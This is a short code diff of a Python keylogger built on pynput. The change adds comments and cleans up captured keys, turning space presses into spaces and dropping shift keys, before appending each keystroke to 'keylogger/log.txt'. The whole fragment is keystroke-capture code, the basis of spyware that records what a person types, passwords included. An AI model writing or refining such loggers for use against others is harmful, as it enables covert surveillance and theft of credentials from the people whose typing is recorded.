@@ -3,10 +3,23 @@ from pynput.keyboard import Listener
 
 # Program stores key strokes and mouse movement within log file
 
-# Append
+# Append function
 def appendtofile(key):
+    # Variable holding keyboard input
     letter = str(key)
+
+    # Replacing single quotes to create clean data
     letter = letter.replace("'",'')
+
+    # Replacing common non-letter key presses
+    if letter == 'Key.space':
+        letter = ' '
+    elif letter == 'Key.shift_r':
+        letter = ''
+    elif letter == 'Key.shift_l':
+        letter = ''
+    
+    # Appending
     with open('keylogger/log.txt','a') as f:
         f.write(letter)
 
